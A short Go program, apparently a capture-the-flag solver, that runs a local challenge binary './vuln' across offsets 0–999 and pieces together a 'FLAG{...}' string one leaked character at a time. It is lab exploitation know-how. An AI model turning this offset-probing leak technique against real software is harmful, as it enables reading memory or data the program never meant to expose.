package main

import (
	"fmt"
	"os/exec"
	"regexp"
	"strings"
)

func main() {
	path := "./vuln"
	re := regexp.MustCompile(`\('(.)'\)`)

	foundFlag := false
	var partialFlag string

	for offset := 0; offset < 1000; offset++ {
		cmd := exec.Command(path, fmt.Sprintf("%d", offset))
		outputRaw, err := cmd.CombinedOutput()
		if err != nil {
			fmt.Printf("Erreur exécution offset %d: %v\n", offset, err)
			continue
		}
		output := string(outputRaw)

		match := re.FindStringSubmatch(output)
		if len(match) == 2 {
			char := match[1]
			partialFlag += char
		}

		if strings.Contains(partialFlag, "FLAG{") {
			foundFlag = true
		}

		if foundFlag && strings.Contains(partialFlag, "}") {
			start := strings.Index(partialFlag, "FLAG{")
			end := strings.Index(partialFlag, "}") + 1
			theFlag := partialFlag[start:end]
			fmt.Printf("Le flag détecté est : %s\n", theFlag)
			return
		}
	}

	fmt.Println("Aucun flag détecté.")
}
